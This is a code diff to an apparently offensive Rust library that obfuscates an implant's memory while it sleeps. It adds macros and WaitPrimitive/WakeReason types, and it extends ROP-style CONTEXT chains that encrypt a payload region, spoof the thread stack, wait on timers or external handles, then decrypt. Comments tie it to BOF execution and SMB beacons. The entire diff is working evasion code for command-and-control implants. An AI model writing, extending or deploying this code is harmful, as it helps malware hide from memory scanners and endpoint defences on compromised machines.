@@ -176,6 +176,98 @@ macro_rules! foliage {
     };
 }
 
+// =============================================================================
+// Handle-based macros with WakeReason return
+// =============================================================================
+
+/// Initiates execution obfuscation using `TpSetTimer` with custom wait primitive.
+/// Returns `WakeReason` indicating which handle was signaled or if timeout occurred.
+///
+/// # Example
+/// ```ignore
+/// use hypnus::{timer_wait, WaitPrimitive, WakeReason, ObfMode};
+/// 
+/// // Wait on a single event with 5 second timeout
+/// let reason = timer_wait!(ptr, size, WaitPrimitive::single(event, 5000), ObfMode::Rwx);
+/// match reason {
+///     WakeReason::Handle0 => println!("Event signaled!"),
+///     WakeReason::Timeout => println!("Timeout"),
+///     _ => {}
+/// }
+/// ```
+#[macro_export]
+macro_rules! timer_wait {
+    ($base:expr, $size:expr, $wait:expr) => {
+        $crate::__private::hypnus_entry_with_wait(
+            $base, 
+            $size, 
+            $wait, 
+            $crate::Obfuscation::Timer, 
+            $crate::ObfMode::None
+        )
+    };
+
+    ($base:expr, $size:expr, $wait:expr, $mode:expr) => {
+        $crate::__private::hypnus_entry_with_wait(
+            $base, 
+            $size, 
+            $wait, 
+            $crate::Obfuscation::Timer, 
+            $mode
+        )
+    };
+}
+
+/// Initiates execution obfuscation using `TpSetWait` with custom wait primitive.
+/// Returns `WakeReason` indicating which handle was signaled or if timeout occurred.
+#[macro_export]
+macro_rules! wait_handles {
+    ($base:expr, $size:expr, $wait:expr) => {
+        $crate::__private::hypnus_entry_with_wait(
+            $base, 
+            $size, 
+            $wait, 
+            $crate::Obfuscation::Wait, 
+            $crate::ObfMode::None
+        )
+    };
+
+    ($base:expr, $size:expr, $wait:expr, $mode:expr) => {
+        $crate::__private::hypnus_entry_with_wait(
+            $base, 
+            $size, 
+            $wait, 
+            $crate::Obfuscation::Wait, 
+            $mode
+        )
+    };
+}
+
+/// Initiates execution obfuscation using `NtQueueApcThread` with custom wait primitive.
+/// Returns `WakeReason` indicating which handle was signaled or if timeout occurred.
+#[macro_export]
+macro_rules! foliage_wait {
+    ($base:expr, $size:expr, $wait:expr) => {
+        $crate::__private::hypnus_entry_with_wait(
+            $base, 
+            $size, 
+            $wait, 
+            $crate::Obfuscation::Foliage, 
+            $crate::ObfMode::None
+        )
+    };
+
+    ($base:expr, $size:expr, $wait:expr, $mode:expr) => {
+        $crate::__private::hypnus_entry_with_wait(
+            $base, 
+            $size, 
+            $wait, 
+            $crate::Obfuscation::Foliage, 
+            $mode
+        )
+    };
+}
+
 /// Enumeration of supported memory obfuscation strategies.
 pub enum Obfuscation {
     /// The technique using Windows thread pool (`TpSetTimer`).
@@ -218,6 +310,127 @@ impl core::ops::BitOr for ObfMode {
     }
 }
 
+/// Specifies what to wait on during obfuscated sleep.
+/// 
+/// This enables waiting on external handles (like pipe events) in addition to
+/// or instead of a simple timeout, supporting async BOF wakeup and SMB beacons.
+#[derive(Clone, Copy, Debug)]
+pub enum WaitPrimitive {
+    /// Wait for a specified duration (original behavior).
+    /// The thread handle is used internally with a timeout.
+    Timeout {
+        /// Duration in seconds
+        seconds: u64,
+    },
+    
+    /// Wait on external handles with optional timeout.
+    /// Uses WaitForMultipleObjects to wait on up to MAXIMUM_WAIT_OBJECTS handles.
+    Handles {
+        /// Array of handles to wait on (up to 4 for stack allocation)
+        handles: [*mut c_void; 4],
+        /// Number of valid handles in the array
+        count: usize,
+        /// Timeout in milliseconds, or INFINITE (0xFFFFFFFF) for no timeout
+        timeout_ms: u32,
+    },
+}
+
+impl WaitPrimitive {
+    /// Create a timeout-based wait (original behavior)
+    pub fn timeout(seconds: u64) -> Self {
+        Self::Timeout { seconds }
+    }
+    
+    /// Create a single-handle wait with optional timeout
+    pub fn single(handle: *mut c_void, timeout_ms: u32) -> Self {
+        Self::Handles {
+            handles: [handle, null_mut(), null_mut(), null_mut()],
+            count: 1,
+            timeout_ms,
+        }
+    }
+    
+    /// Create a dual-handle wait (e.g., primary + wakeup event)
+    pub fn dual(handle1: *mut c_void, handle2: *mut c_void, timeout_ms: u32) -> Self {
+        Self::Handles {
+            handles: [handle1, handle2, null_mut(), null_mut()],
+            count: 2,
+            timeout_ms,
+        }
+    }
+    
+    /// Create a multi-handle wait (up to 4 handles)
+    pub fn multi(handles: &[*mut c_void], timeout_ms: u32) -> Self {
+        let mut arr = [null_mut(); 4];
+        let count = handles.len().min(4);
+        for (i, h) in handles.iter().take(count).enumerate() {
+            arr[i] = *h;
+        }
+        Self::Handles {
+            handles: arr,
+            count,
+            timeout_ms,
+        }
+    }
+}
+
+/// Indicates why the obfuscated wait returned.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub enum WakeReason {
+    /// Timeout expired (original timer-based sleep behavior)
+    Timeout,
+    
+    /// First handle (index 0) was signaled
+    Handle0,
+    
+    /// Second handle (index 1) was signaled  
+    Handle1,
+    
+    /// Third handle (index 2) was signaled
+    Handle2,
+    
+    /// Fourth handle (index 3) was signaled
+    Handle3,
+    
+    /// Wait failed or was abandoned
+    Error,
+}
+
+impl WakeReason {
+    /// Create from WaitForMultipleObjects return value
+    pub fn from_wfmo_result(result: u32, handle_count: usize) -> Self {
+        if result == WAIT_TIMEOUT {
+            return Self::Timeout;
+        }
+        if result == WAIT_FAILED {
+            return Self::Error;
+        }
+        let index = result.wrapping_sub(WAIT_OBJECT_0) as usize;
+        if index < handle_count {
+            match index {
+                0 => Self::Handle0,
+                1 => Self::Handle1,
+                2 => Self::Handle2,
+                3 => Self::Handle3,
+                _ => Self::Error,
+            }
+        } else {
+            Self::Error
+        }
+    }
+    
+    /// Check if a specific handle was signaled
+    pub fn is_handle(&self, index: usize) -> bool {
+        match (self, index) {
+            (Self::Handle0, 0) => true,
+            (Self::Handle1, 1) => true,
+            (Self::Handle2, 2) => true,
+            (Self::Handle3, 3) => true,
+            _ => false,
+        }
+    }
+}
+
 /// Structure responsible for centralizing memory obfuscation techniques
 #[derive(Clone, Copy, Debug)]
 struct Hypnus {
@@ -227,8 +440,8 @@ struct Hypnus {
     /// Size of the memory region.
     size: u64,
 
-    /// Delay time in seconds.
-    time: u64,
+    /// What to wait on during sleep
+    wait: WaitPrimitive,
 
     /// Resolved WinAPI functions required for execution.
     cfg: &'static Config,
@@ -238,7 +451,7 @@ struct Hypnus {
 }
 
 impl Hypnus {
-    /// Creates a new `Hypnus`.
+    /// Creates a new `Hypnus` with timeout-based wait (backwards compatible).
     #[inline]
     fn new(base: u64, size: u64, time: u64, mode: ObfMode) -> Result<Self> {
         if base == 0 || size == 0 || time == 0 {
@@ -248,7 +461,23 @@ impl Hypnus {
         Ok(Self {
             base,
             size,
-            time,
+            wait: WaitPrimitive::timeout(time),
+            mode,
+            cfg: init_config()?,
+        })
+    }
+    
+    /// Creates a new `Hypnus` with custom wait primitive.
+    #[inline]
+    fn new_with_wait(base: u64, size: u64, wait: WaitPrimitive, mode: ObfMode) -> Result<Self> {
+        if base == 0 || size == 0 {
+            bail!(s!("invalid arguments"))
+        }
+
+        Ok(Self {
+            base,
+            size,
+            wait,
             mode,
             cfg: init_config()?,
         })
@@ -408,11 +637,28 @@ impl Hypnus {
             ctxs[4].Rcx = h_thread as u64;
             ctxs[4].Rdx = ctx_spoof.as_u64();
 
-            // Sleep
-            ctxs[5].jmp(self.cfg, self.cfg.wait_for_single.into());
-            ctxs[5].Rcx = h_thread as u64;
-            ctxs[5].Rdx = self.time * 1000;
-            ctxs[5].R8  = 0;
+            // Sleep/Wait - setup based on WaitPrimitive
+            // Storage for handle array (must live until ROP chain completes)
+            let mut handle_storage: [*mut c_void; 4] = [null_mut(); 4];
+            
+            match self.wait {
+                WaitPrimitive::Timeout { seconds } => {
+                    // Original behavior: WaitForSingleObject on thread handle with timeout
+                    ctxs[5].jmp(self.cfg, self.cfg.wait_for_single.into());
+                    ctxs[5].Rcx = h_thread as u64;
+                    ctxs[5].Rdx = seconds * 1000;
+                    ctxs[5].R8  = 0;
+                }
+                WaitPrimitive::Handles { handles, count, timeout_ms } => {
+                    // WFMO: WaitForMultipleObjects on external handles
+                    handle_storage = handles;
+                    ctxs[5].jmp(self.cfg, self.cfg.wait_for_multiple.into());
+                    ctxs[5].Rcx = count as u64;
+                    ctxs[5].Rdx = handle_storage.as_ptr() as u64;
+                    ctxs[5].R8  = 0; // bWaitAll = FALSE
+                    ctxs[5].R9  = timeout_ms as u64;
+                }
+            }
 
             // Decrypt region
             ctxs[6].jmp(self.cfg, self.cfg.system_function041.into());
@@ -439,6 +685,9 @@ impl Hypnus {
 
             // Layout spoofed CONTEXT chain on stack
             self.cfg.stack.spoof(&mut ctxs, self.cfg, Obfuscation::Timer)?;
+            
+            // Ensure handle_storage lives through the ROP chain
+            let _ = &handle_storage;
 
             // Patch old_protect into expected return slots
             ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
@@ -651,11 +900,28 @@ impl Hypnus {
             ctxs[4].Rcx = h_thread as u64;
             ctxs[4].Rdx = ctx_spoof.as_u64();
 
-            // Sleep
-            ctxs[5].jmp(self.cfg, self.cfg.wait_for_single.into());
-            ctxs[5].Rcx = h_thread as u64;
-            ctxs[5].Rdx = self.time * 1000;
-            ctxs[5].R8  = 0;
+            // Sleep/Wait - setup based on WaitPrimitive
+            // Storage for handle array (must live until ROP chain completes)
+            let mut handle_storage: [*mut c_void; 4] = [null_mut(); 4];
+            
+            match self.wait {
+                WaitPrimitive::Timeout { seconds } => {
+                    // Original behavior: WaitForSingleObject on thread handle with timeout
+                    ctxs[5].jmp(self.cfg, self.cfg.wait_for_single.into());
+                    ctxs[5].Rcx = h_thread as u64;
+                    ctxs[5].Rdx = seconds * 1000;
+                    ctxs[5].R8  = 0;
+                }
+                WaitPrimitive::Handles { handles, count, timeout_ms } => {
+                    // WFMO: WaitForMultipleObjects on external handles
+                    handle_storage = handles;
+                    ctxs[5].jmp(self.cfg, self.cfg.wait_for_multiple.into());
+                    ctxs[5].Rcx = count as u64;
+                    ctxs[5].Rdx = handle_storage.as_ptr() as u64;
+                    ctxs[5].R8  = 0; // bWaitAll = FALSE
+                    ctxs[5].R9  = timeout_ms as u64;
+                }
+            }
 
             // Decrypt region
             ctxs[6].jmp(self.cfg, self.cfg.system_function041.into());
@@ -682,6 +948,9 @@ impl Hypnus {
 
             // Layout spoofed CONTEXT chain on stack
             self.cfg.stack.spoof(&mut ctxs, self.cfg, Obfuscation::Wait)?;
+            
+            // Ensure handle_storage lives through the ROP chain
+            let _ = &handle_storage;
 
             // Patch old_protect into expected return slots
             ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
@@ -845,11 +1114,28 @@ impl Hypnus {
             ctxs[4].Rcx = thread as u64;
             ctxs[4].Rdx = ctx_spoof.as_u64();
 
-            // Sleep primitive using the current thread handle and a delay
-            ctxs[5].Rip = self.cfg.wait_for_single.into();
-            ctxs[5].Rcx = thread as u64;
-            ctxs[5].Rdx = self.time * 1000;
-            ctxs[5].R8  = 0;
+            // Sleep/Wait - setup based on WaitPrimitive
+            // Storage for handle array (must live until ROP chain completes)
+            let mut handle_storage: [*mut c_void; 4] = [null_mut(); 4];
+            
+            match self.wait {
+                WaitPrimitive::Timeout { seconds } => {
+                    // Original behavior: WaitForSingleObject on thread handle with timeout
+                    ctxs[5].Rip = self.cfg.wait_for_single.into();
+                    ctxs[5].Rcx = thread as u64;
+                    ctxs[5].Rdx = seconds * 1000;
+                    ctxs[5].R8  = 0;
+                }
+                WaitPrimitive::Handles { handles, count, timeout_ms } => {
+                    // WFMO: WaitForMultipleObjects on external handles
+                    handle_storage = handles;
+                    ctxs[5].Rip = self.cfg.wait_for_multiple.into();
+                    ctxs[5].Rcx = count as u64;
+                    ctxs[5].Rdx = handle_storage.as_ptr() as u64;
+                    ctxs[5].R8  = 0; // bWaitAll = FALSE
+                    ctxs[5].R9  = timeout_ms as u64;
+                }
+            }
 
             // Decrypts (unmasks) the memory after waking up
             ctxs[6].Rip = self.cfg.system_function041.into();
@@ -876,6 +1162,9 @@ impl Hypnus {
 
             // Layout the entire spoofed CONTEXT chain on the stack
             self.cfg.stack.spoof(&mut ctxs, self.cfg, Obfuscation::Foliage)?;
+            
+            // Ensure handle_storage lives through the ROP chain
+            let _ = &handle_storage;
 
             // Write `old_protect` values into the expected return slots
             ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
@@ -937,7 +1226,7 @@ pub mod __private {
     use alloc::boxed::Box;
     use super::*;
 
-    /// Execution sequence using the specified obfuscation strategy.
+    /// Execution sequence using the specified obfuscation strategy (backwards compatible).
     pub fn hypnus_entry(base: *mut c_void, size: u64, time: u64, obf: Obfuscation, mode: ObfMode) {
         let master = ConvertThreadToFiber(null_mut());
         if master.is_null() {
@@ -971,6 +1260,88 @@ pub mod __private {
             Err(_error) => {
                 #[cfg(debug_assertions)]
                 dinvk::println!("[Hypnus::new] {:?}", _error);
+            }
+        }
+    }
+    
+    /// Execution sequence with custom wait primitive, returns which handle was signaled.
+    pub fn hypnus_entry_with_wait(
+        base: *mut c_void, 
+        size: u64, 
+        wait: WaitPrimitive, 
+        obf: Obfuscation, 
+        mode: ObfMode
+    ) -> WakeReason {
+        let master = ConvertThreadToFiber(null_mut());
+        if master.is_null() {
+            return WakeReason::Error;
+        }
+
+        match Hypnus::new_with_wait(base as u64, size, wait, mode) {
+            Ok(hypnus) => {
+                // Store the wait primitive for later wake reason calculation
+                let handle_count = match wait {
+                    WaitPrimitive::Timeout { .. } => 0,
+                    WaitPrimitive::Handles { count, .. } => count,
+                };
+                
+                // Creates the context to be passed into the new fiber.
+                let fiber_ctx = Box::new(FiberContext {
+                    hypnus: Box::new(hypnus),
+                    obf,
+                    master,
+                });
+
+                // Creates a new fiber with 1MB stack, pointing to the `hypnus_fiber` function.
+                let fiber = CreateFiber(
+                    0x100000, 
+                    Some(hypnus_fiber), 
+                    Box::into_raw(fiber_ctx).cast()
+                );
+                
+                if fiber.is_null() {
+                    return WakeReason::Error;
+                }
+
+                SwitchToFiber(fiber);
+                DeleteFiber(fiber);
+                ConvertFiberToThread();
+                
+                // Determine wake reason by checking which handle is signaled
+                // For timeout-based waits, always return Timeout
+                if handle_count == 0 {
+                    return WakeReason::Timeout;
+                }
+                
+                // For handle-based waits, check each handle
+                if let WaitPrimitive::Handles { handles, count, .. } = wait {
+                    for i in 0..count {
+                        // Check if this handle is signaled (non-blocking wait)
+                        let result = WaitForMultipleObjects(
+                            1,
+                            &handles[i] as *const _ as *const *mut c_void,
+                            0,
+                            0, // Don't wait
+                        );
+                        if result == WAIT_OBJECT_0 {
+                            return match i {
+                                0 => WakeReason::Handle0,
+                                1 => WakeReason::Handle1,
+                                2 => WakeReason::Handle2,
+                                3 => WakeReason::Handle3,
+                                _ => WakeReason::Error,
+                            };
+                        }
+                    }
+                }
+                
+                // No handle was signaled, must have been timeout
+                WakeReason::Timeout
+            }
+            Err(_error) => {
+                #[cfg(debug_assertions)]
+                dinvk::println!("[Hypnus::new_with_wait] {:?}", _error);
+                WakeReason::Error
             }
         }
     }
